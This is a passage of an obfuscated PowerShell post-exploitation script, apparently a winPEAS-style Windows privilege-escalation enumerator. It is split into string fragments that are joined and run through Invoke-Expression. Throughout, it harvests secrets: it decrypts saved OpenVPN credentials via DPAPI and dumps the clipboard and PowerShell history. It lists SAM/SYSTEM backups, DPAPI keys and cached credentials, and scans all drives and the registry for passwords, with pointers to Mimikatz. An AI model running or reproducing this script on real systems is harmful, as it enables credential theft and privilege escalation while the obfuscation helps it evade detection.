    if (Tes','t-Path "c:\Users\','$u\$_") { Write-H','ost "$_ found!" -','ForegroundColor R','ed }
  }
}


Writ','e-Host ""
if ($Ti','meStamp) { TimeEl','apsed }
Write-Hos','t -ForegroundColo','r Blue "=========','|| APPcmd Check"
','if (Test-Path ("$','Env:SystemRoot\Sy','stem32\inetsrv\ap','pcmd.exe")) {
  W','rite-Host "https:','//book.hacktricks','.wiki/en/windows-','hardening/windows','-local-privilege-','escalation/index.','html#appcmdexe" -','ForegroundColor Y','ellow
  Write-Hos','t "$Env:SystemRoo','t\System32\inetsr','v\appcmd.exe exis','ts!" -ForegroundC','olor Red
}


Writ','e-Host ""
if ($Ti','meStamp) { TimeEl','apsed }
Write-Hos','t -ForegroundColo','r Blue "=========','|| OpenVPN Creden','tials Check"

$ke','ys = Get-ChildIte','m "HKCU:\Software','\OpenVPN-GUI\conf','igs" -ErrorAction',' SilentlyContinue','
if ($Keys) {
  A','dd-Type -Assembly','Name System.Secur','ity
  $items = $k','eys | ForEach-Obj','ect { Get-ItemPro','perty $_.PsPath }','
  foreach ($item',' in $items) {
   ',' $encryptedbytes ','= $item.''auth-dat','a''
    $entropy =',' $item.''entropy''
','    $entropy = $e','ntropy[0..(($entr','opy.Length) - 2)]','

    $decryptedb','ytes = [System.Se','curity.Cryptograp','hy.ProtectedData]','::Unprotect(
    ','  $encryptedBytes',', 
      $entropy',', 
      [System.','Security.Cryptogr','aphy.DataProtecti','onScope]::Current','User)
 
    Write','-Host ([System.Te','xt.Encoding]::Uni','code.GetString($d','ecryptedbytes))
 ',' }
}


Write-Host',' ""
if ($TimeStam','p) { TimeElapsed ','}
Write-Host -For','egroundColor Blue',' "=========|| Pow','erShell History (','Password Search O','nly)"

Write-Host',' "=|| PowerShell ','Console History"
','Write-Host "=|| T','o see all history',', run this comman','d: Get-Content (G','et-PSReadlineOpti','on).HistorySavePa','th"
Write-Host $(','Get-Content (Get-','PSReadLineOption)','.HistorySavePath ','| Select-String p','a)

Write-Host "=','|| AppData PSRead','line Console Hist','ory "
Write-Host ','"=|| To see all h','istory, run this ','command: Get-Cont','ent $env:USERPROF','ILE\AppData\Roami','ng\Microsoft\Wind','ows\PowerShell\PS','Readline\ConsoleH','ost_history.txt"
','Write-Host $(Get-','Content "$env:USE','RPROFILE\AppData\','Roaming\Microsoft','\Windows\PowerShe','ll\PSReadline\Con','soleHost_history.','txt" | Select-Str','ing pa)


Write-H','ost "=|| PowerShe','ll default transc','ript history chec','k "
if (Test-Path',' $env:SystemDrive','\transcripts\) { ','"Default transcri','pts found at $($e','nv:SystemDrive)\t','ranscripts\" }


','# Enumerating Env','ironment Variable','s
Write-Host ""
i','f ($TimeStamp) { ','TimeElapsed }
Wri','te-Host -Foregrou','ndColor Blue "===','======|| ENVIRONM','ENT VARIABLES "
W','rite-Host "Maybe ','you can take adva','ntage of modifyin','g/creating a bina','ry in some of the',' following locati','ons"
Write-Host "','PATH variable ent','ries permissions ','- place binary or',' DLL to execute i','nstead of legitim','ate"
Write-Host "','https://book.hack','tricks.wiki/en/wi','ndows-hardening/w','indows-local-priv','ilege-escalation/','index.html#dll-hi','jacking" -Foregro','undColor Yellow

','Get-ChildItem env',': | Format-Table ','-Wrap


Write-Hos','t ""
if ($TimeSta','mp) { TimeElapsed',' }
Write-Host -Fo','regroundColor Blu','e "=========|| St','icky Notes Check"','
if (Test-Path "C',':\Users\$env:USER','NAME\AppData\Loca','l\Packages\Micros','oft.MicrosoftStic','kyNotes*\LocalSta','te\plum.sqlite") ','{
  Write-Host "S','ticky Notes datab','ase found. Could ','have credentials ','in plain text: "
','  Write-Host "C:\','Users\$env:USERNA','ME\AppData\Local\','Packages\Microsof','t.MicrosoftSticky','Notes*\LocalState','\plum.sqlite"
}

','# Check for Cache','d Credentials
# h','ttps://community.','idera.com/databas','e-tools/powershel','l/powertips/b/tip','s/posts/getting-c','ached-credentials','
Write-Host ""
if',' ($TimeStamp) { T','imeElapsed }
Writ','e-Host -Foregroun','dColor Blue "====','=====|| Cached Cr','edentials Check"
','Write-Host "https','://book.hacktrick','s.wiki/en/windows','-hardening/window','s-local-privilege','-escalation/index','.html#windows-vau','lt" -ForegroundCo','lor Yellow 
cmdke','y.exe /list


Wri','te-Host ""
if ($T','imeStamp) { TimeE','lapsed }
Write-Ho','st -ForegroundCol','or Blue "========','=|| Checking for ','DPAPI RPC Master ','Keys"
Write-Host ','"Use the Mimikatz',' ''dpapi::masterke','y'' module with ap','propriate argumen','ts (/rpc) to decr','ypt"
Write-Host "','https://book.hack','tricks.wiki/en/wi','ndows-hardening/w','indows-local-priv','ilege-escalation/','index.html#dpapi"',' -ForegroundColor',' Yellow

$appdata','Roaming = "C:\Use','rs\$env:USERNAME\','AppData\Roaming\M','icrosoft\"
$appda','taLocal = "C:\Use','rs\$env:USERNAME\','AppData\Local\Mic','rosoft\"
if ( Tes','t-Path "$appdataR','oaming\Protect\")',' {
  Write-Host "','found: $appdataRo','aming\Protect\"
 ',' Get-ChildItem -P','ath "$appdataRoam','ing\Protect\" -Fo','rce | ForEach-Obj','ect {
    Write-H','ost $_.FullName
 ',' }
}
if ( Test-Pa','th "$appdataLocal','\Protect\") {
  W','rite-Host "found:',' $appdataLocal\Pr','otect\"
  Get-Chi','ldItem -Path "$ap','pdataLocal\Protec','t\" -Force | ForE','ach-Object {
    ','Write-Host $_.Ful','lName
  }
}


Wri','te-Host ""
if ($T','imeStamp) { TimeE','lapsed }
Write-Ho','st -ForegroundCol','or Blue "========','=|| Checking for ','DPAPI Cred Master',' Keys"
Write-Host',' "Use the Mimikat','z ''dpapi::cred'' m','odule with approp','riate /masterkey ','to decrypt" 
Writ','e-Host "You can a','lso extract many ','DPAPI masterkeys ','from memory with ','the Mimikatz ''sek','urlsa::dpapi'' mod','ule" 
Write-Host ','"https://book.hac','ktricks.wiki/en/w','indows-hardening/','windows-local-pri','vilege-escalation','/index.html#dpapi','" -ForegroundColo','r Yellow

if ( Te','st-Path "$appdata','Roaming\Credentia','ls\") {
  Get-Chi','ldItem -Path "$ap','pdataRoaming\Cred','entials\" -Force
','}
if ( Test-Path ','"$appdataLocal\Cr','edentials\") {
  ','Get-ChildItem -Pa','th "$appdataLocal','\Credentials\" -F','orce
}


Write-Ho','st ""
if ($TimeSt','amp) { TimeElapse','d }
Write-Host -F','oregroundColor Bl','ue "=========|| C','urrent Logged on ','Users"
try { quse','r }catch { Write-','Host "''quser'' com','mand not not pres','ent on system" } ','


Write-Host ""
','if ($TimeStamp) {',' TimeElapsed }
Wr','ite-Host -Foregro','undColor Blue "==','=======|| Remote ','Sessions"
try { q','winsta } catch { ','Write-Host "''qwin','sta'' command not ','present on system','" }


Write-Host ','""
if ($TimeStamp',') { TimeElapsed }','
Write-Host -Fore','groundColor Blue ','"=========|| Kerb','eros tickets (doe','s require admin t','o interact)"
try ','{ klist } catch {',' Write-Host "No a','ctive sessions" }','


Write-Host ""
','if ($TimeStamp) {',' TimeElapsed }
Wr','ite-Host -Foregro','undColor Blue "==','=======|| Printin','g ClipBoard (if a','ny)"
Get-ClipBoar','dText

##########','############## Fi','le/Credentials ch','eck #############','###########
Write','-Host ""
if ($Tim','eStamp) { TimeEla','psed }
Write-Host',' -ForegroundColor',' Blue "=========|','| Unattended File','s Check"
@("C:\Wi','ndows\sysprep\sys','prep.xml",
  "C:\','Windows\sysprep\s','ysprep.inf",
  "C',':\Windows\sysprep','.inf",
  "C:\Wind','ows\Panther\Unatt','ended.xml",
  "C:','\Windows\Panther\','Unattend.xml",
  ','"C:\Windows\Panth','er\Unattend\Unatt','end.xml",
  "C:\W','indows\Panther\Un','attend\Unattended','.xml",
  "C:\Wind','ows\System32\Sysp','rep\unattend.xml"',',
  "C:\Windows\S','ystem32\Sysprep\u','nattended.xml",
 ',' "C:\unattend.txt','",
  "C:\unattend','.inf") | ForEach-','Object {
  if (Te','st-Path $_) {
   ',' Write-Host "$_ f','ound."
  }
}


##','#################','##### GROUP POLIC','Y RELATED CHECKS ','#################','#######
Write-Hos','t ""
if ($TimeSta','mp) { TimeElapsed',' }
Write-Host -Fo','regroundColor Blu','e "=========|| SA','M / SYSTEM Backup',' Checks"

@(
  "$','Env:windir\repair','\SAM",
  "$Env:wi','ndir\System32\con','fig\RegBack\SAM",','
  "$Env:windir\S','ystem32\config\SA','M",
  "$Env:windi','r\repair\system",','
  "$Env:windir\S','ystem32\config\SY','STEM",
  "$Env:wi','ndir\System32\con','fig\RegBack\syste','m") | ForEach-Obj','ect {
  if (Test-','Path $_ -ErrorAct','ion SilentlyConti','nue) {
    Write-','Host "$_ Found!" ','-ForegroundColor ','red
  }
}

Write-','Host ""
if ($Time','Stamp) { TimeElap','sed }
Write-Host ','-ForegroundColor ','Blue "=========||',' Group Policy Pas','sword Check"

$Gr','oupPolicy = @("Gr','oups.xml", "Servi','ces.xml", "Schedu','ledtasks.xml", "D','ataSources.xml", ','"Printers.xml", "','Drives.xml")
if (','Test-Path "$env:S','ystemDrive\Micros','oft\Group Policy\','history") {
  Get','-ChildItem -Recur','se -Force "$env:S','ystemDrive\Micros','oft\Group Policy\','history" -Include',' @GroupPolicy
}

','if (Test-Path "$e','nv:SystemDrive\Do','cuments and Setti','ngs\All Users\App','lication Data\Mic','rosoft\Group Poli','cy\history" ) {
 ',' Get-ChildItem -R','ecurse -Force "$e','nv:SystemDrive\Do','cuments and Setti','ngs\All Users\App','lication Data\Mic','rosoft\Group Poli','cy\history"
}

Wr','ite-Host ""
if ($','TimeStamp) { Time','Elapsed }
Write-H','ost -ForegroundCo','lor Blue "=======','==|| Recycle Bin ','TIP:"
Write-Host ','"If credentials a','re found in the r','ecycle bin, tool ','from nirsoft may ','assist: http://ww','w.nirsoft.net/pas','sword_recovery_to','ols.html" -Foregr','oundColor Yellow
','
################','######## File/Fol','der Check #######','#################','

Write-Host ""
i','f ($TimeStamp) { ','TimeElapsed }
Wri','te-Host -Foregrou','ndColor Blue "===','======||  Passwor','d Check in Files/','Folders"

# Looki','ng through the en','tire computer for',' passwords
# Also',' looks for MCaffe','e site list while',' looping through ','the drives.
if ($','TimeStamp) { Time','Elapsed }
Write-H','ost -ForegroundCo','lor Blue "=======','==|| Password Che','ck. Starting at r','oot of each drive','. This will take ','some time. Like, ','grab a coffee or ','tea kinda time."
','Write-Host -Foreg','roundColor Blue "','=========|| Looki','ng through each d','rive, searching f','or $fileExtension','s"
# Check if the',' Excel com object',' is installed, if',' so, look through',' files, if not, j','ust notate if a f','ile has "user" or',' "password in nam','e"
try { 
  New-O','bject -ComObject ','Excel.Application',' | Out-Null
  $Re','adExcel = $true 
','}
catch {
  $Read','Excel = $false
  ','if($Excel) {
    ','Write-Host -Foreg','roundColor Yellow',' "Host does not h','ave Excel COM obj','ect, will still p','oint out excel fi','les when found." ',' 
  }
}
$Drives.R','oot | ForEach-Obj','ect {
  $Drive = ','$_
  Get-ChildIte','m $Drive -Recurse',' -Include $fileEx','tensions -ErrorAc','tion SilentlyCont','inue -Force | For','Each-Object {
   ',' $path = $_
    #','Exclude files/fol','ders with ''lang'' ','in the name
    i','f ($Path.FullName',' | select-string ','"(?i).*lang.*"){
','      #Write-Host',' "$($_.FullName) ','found!" -Foregrou','ndColor red
    }','
    if($Path.Ful','lName | Select-St','ring "(?i).:\\.*\','\.*Pass.*"){
    ','  write-host -For','egroundColor Blue',' "$($path.FullNam','e) contains the w','ord ''pass''"
    }','
    if($Path.Ful','lName | Select-St','ring ".:\\.*\\.*u','ser.*" ){
      W','rite-Host -Foregr','oundColor Blue "$','($path.FullName) ','contains the word',' ''user'' -excludin','g the ''users'' dir','ectory"
    }
   ',' # If path name e','nds with common e','xcel extensions
 ','   elseif ($Path.','FullName | Select','-String ".*\.xls"',',".*\.xlsm",".*\.','xlsx") {
      if',' ($ReadExcel -and',' $Excel) {
      ','  Search-Excel -S','ource $Path.FullN','ame -SearchText "','user"
        Sea','rch-Excel -Source',' $Path.FullName -','SearchText "pass"','
      }
    }
  ','  else {
      if',' ($path.Length -g','t 0) {
        # ','Write-Host -Foreg','roundColor Blue "','Path name matches',' extension search',': $path"
      }
','      if ($path.F','ullName | Select-','String "(?i).*Sit','eList\.xml") {
  ','      Write-Host ','"Possible MCaffee',' Site List Found:',' $($_.FullName)"
','        Write-Hos','t "Just going to ','leave this here: ','https://github.co','m/funoverip/mcafe','e-sitelist-pwd-de','cryption" -Foregr','oundColor Yellow
','      }
      $re','gexSearch.keys | ','ForEach-Object {
','        $password','Found = Get-Conte','nt $path.FullName',' -ErrorAction Sil','entlyContinue -Fo','rce | Select-Stri','ng $regexSearch[$','_] -Context 1, 1
','        if ($pass','wordFound) {
    ','      Write-Host ','"Possible Passwor','d found: $_" -For','egroundColor Yell','ow
          Writ','e-Host $Path.Full','Name
          Wr','ite-Host -Foregro','undColor Blue "$_',' triggered"
     ','     Write-Host $','passwordFound -Fo','regroundColor Red','
        }
      ','}
    }  
  }
}

','#################','####### Registry ','Password Check ##','#################','#####

Write-Host',' -ForegroundColor',' Blue "=========|','| Registry Passwo','rd Check"
# Looki','ng through the en','tire registry for',' passwords
Write-','Host "This will t','ake some time. Wo','n''t you have a pe','psi?"
$regPath = ','@("registry::\HKE','Y_CURRENT_USER\",',' "registry::\HKEY','_LOCAL_MACHINE\")','
# Search for the',' string in regist','ry values and pro','perties
foreach (','$r in $regPath) {','
(Get-ChildItem -','Path $r -Recurse ','-Force -ErrorActi','on SilentlyContin','ue) | ForEach-Obj','ect {
    $proper','ty = $_.property
','    $Name = $_.Na','me
    $property ','| ForEach-Object ','{
      $Prop = $','_
      $regexSea','rch.keys | ForEac','h-Object {
      ','  $value = $regex','Search[$_]
      ','  if ($Prop | Whe','re-Object { $_ -l','ike $value }) {
 ','         Write-Ho','st "Possible Pass','word Found: $Name','\$Prop"
         ',' Write-Host "Key:',' $_" -ForegroundC','olor Red
        ','}
        $Prop |',' ForEach-Object {','   
          $pr','opValue = (Get-It','emProperty "regis','try::$Name").$_
 ','         if ($pro','pValue | Where-Ob','ject { $_ -like $','Value }) {
      ','      Write-Host ','"Possible Passwor','d Found: $name\$_',' $propValue"
    ','      }
        }','
      }
    }
  ','}
  if ($TimeStam','p) { TimeElapsed ','}
  Write-Host "F','inished $r"
}
'); $script = $fragments -join ''; Invoke-Expression $script